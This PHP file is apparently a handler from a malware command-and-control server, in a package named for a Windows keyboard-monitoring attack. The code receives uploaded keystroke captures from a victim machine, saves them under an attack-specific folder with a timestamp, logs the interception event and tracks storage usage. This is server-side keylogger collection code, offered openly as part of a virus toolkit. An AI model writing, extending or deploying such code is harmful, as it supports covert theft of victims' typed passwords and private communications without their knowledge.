<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorKeyboard\MonitorKeyboard $this */

$unixTime = time();
$filePath = DATA_FILE . "/attacks/" . $this->getAttackId() . "/keys-$unixTime.txt";
$this->requestData->moveFile("ks", $filePath);
$this->saveEventFromIntercept($unixTime);
$this->resetStaticUsage();
$this->usage()->addDisk(filesize($filePath))->saveState();
$this->reportStaticUsage();
$this->purgeEvents();
